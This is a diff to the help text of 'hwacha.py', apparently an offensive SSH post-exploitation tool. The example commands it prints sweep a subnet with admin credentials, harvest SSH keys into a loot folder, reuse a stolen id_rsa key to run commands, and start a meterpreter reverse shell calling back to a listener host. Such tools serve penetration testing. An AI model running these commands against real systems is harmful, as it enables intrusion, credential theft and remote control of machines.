@@ -352,9 +352,11 @@ def examples():
     print 'To run commands, use -x [COMMAND]'
     print 'to run modules, use -m [MODULE]'
     print 'to specify module options, use -o [ARG=ARG ARG=ARG]'
+    print 'to see all available modules, use -L'
     print CRED + 'Example usage:' + CEND
-    print CYELLOW + 'python hwacha.py -t 192.168.1.1/24 -u admin  -p password -x id' + CEND
+    print CYELLOW + 'python hwacha.py -t 192.168.1.1/24 -u admin  -p password' + CEND
     print CYELLOW + 'python hwacha.py -t 192.168.1.100-200 -u admin  -p password -m keys' + CEND
+    print CYELLOW + 'python hwacha.py -t 192.168.1.100-200 -u admin  -i loot/keys/192.168.1.101/id_rsa -x id' + CEND
     print CYELLOW + 'python hwacha.py -t 192.168.1.123 -u admin  -p password -m meterpreter -o \"LPORT=4444 LHOST=192.168.1.150 TYPE=64\"' + CEND
 
 def print_modules():
